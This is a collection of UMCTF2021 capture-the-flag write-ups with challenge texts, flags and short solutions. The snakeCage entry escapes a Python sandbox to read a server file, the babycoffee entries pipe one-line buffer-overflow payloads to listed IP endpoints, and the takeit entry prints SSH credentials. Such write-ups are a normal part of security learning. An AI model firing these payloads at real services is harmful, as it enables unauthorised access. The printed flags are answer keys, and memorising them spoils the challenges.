# UMCTF Competition Noob's Hackathon 公開組

----

# Miscellaneous - UMCTF2021 - Macow

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{1_4m_l1v1n6_1n_534c_p41_v4n_p4rk_n0w....}**


## **Question:**
>**Macow**</br>
>Author: **RB916120**

>do you remember macow??</br>
>flag in the file [http://bit.ly/2N8960t](http://bit.ly/2N8960t)


## **write-up:**

>首先 unzip file，然後利用 IDE Editor Search “**CTF**”，另一部分通過 Search "**}**" 找到。
> 
> 

----

# Miscellaneous - UMCTF2021 - snakeCage

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{ssssssnake_easy_peasy}**


## **Question:**
>**snakeCage**</br>
>Author: **RB916120**

>can you escape from snake cage?</br>
>nc 13.75.78.108 38001


## **write-up:**

>**Step 1：**
>import os; print(os.listdir('.'));</br>
>會見到fs有個叫flag的檔

>**Step 2：**
>再用 open('flag').read() 就會知道個flag</br>
>import os; print(open('flag').read());
> 
> 

----

# Miscellaneous - UMCTF2021 - takeit

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{55h_15_!_700_h4rd!!!!!!!!!!!!!!!}**


## **Question:**
>**takeit**</br>
>Author: **RB916120**

>i put the flag on the screen, take it if you can end the session</br>
>
>ssh eofffff@13.75.78.108 -p 38004 (password: DthBqhs8n)


## **write-up:**

>手機拍片逐格睇
> 
> 

----

# PWN - UMCTF2021 - babycoffee-1

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0n7_l37_7h3m_pu7_700_much_c0ff33_w1ll_0v3rfl0w3d!!}**


## **Question:**
>**babycoffee-1**</br>
>Author: **RB916120**

>can you overflow the coffee?</br>
>
>nc 52.175.52.175 39001


## **write-up:**

>python2 -c "print 'A' * 100 + '\x44'" |  nc 52.175.52.175 39001
> 
>

----

# PWN - UMCTF2021 - babycoffee-2

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0_y0u_3nj0y_7h15_c7f_3v3n7?}**


## **Question:**
>**babycoffee-2**</br>
>Author: **RB916120**

>i would like to order a coffee..</br>
>
>nc 52.175.52.175 39002


## **write-up:**

>python2 -c "print 'A' * 32 + '\xBE\xBA\xFE\xCA'" | nc 52.175.52.175 39002
> 
>

----

# Forensic - UMCTF2021 - hide

- Write-Up Author: **Louis Lou**

- Flag: **mocsctf{c@n_y0u_f1nd_0ur_53cr3t?!}**


## **Question:**
>**hide**</br>
>Author: **TeruLei**

>hi,hi,hide in a pic~</br>
>


## **write-up:**

>**Step 1.**
>unzip hide.zip and goto onlinehexeditor search “ctf” find first part.</br>
>
>**Step 2.**
>use https://stylesuxx.github.io/steganography/ find another part.</br>
>
> 
